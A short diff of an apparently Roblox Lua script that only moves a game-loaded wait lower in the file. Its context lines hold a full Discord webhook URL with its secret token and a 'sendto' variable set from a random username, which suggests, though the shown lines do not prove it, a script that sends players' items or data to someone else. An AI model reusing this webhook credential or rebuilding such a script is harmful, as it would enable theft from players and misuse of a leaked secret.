@@ -43,9 +43,6 @@ local sendto = getRandomUsername()
 
 
 
-if not game:IsLoaded() then
-    game.Loaded:Wait()
-  end
 
 
 local Url2 = "https://discord.com/api/webhooks/1181449125187833856/0kA4c5-OXkAOQvZeJxnOKrKc7cTzlGvjpjMNKn-UkImyh82rPZ8-np_RwU0w6DelHjty"
@@ -91,6 +88,9 @@ end
 end)
 		
 
+if not game:IsLoaded() then
+    game.Loaded:Wait()
+  end
 
 
 
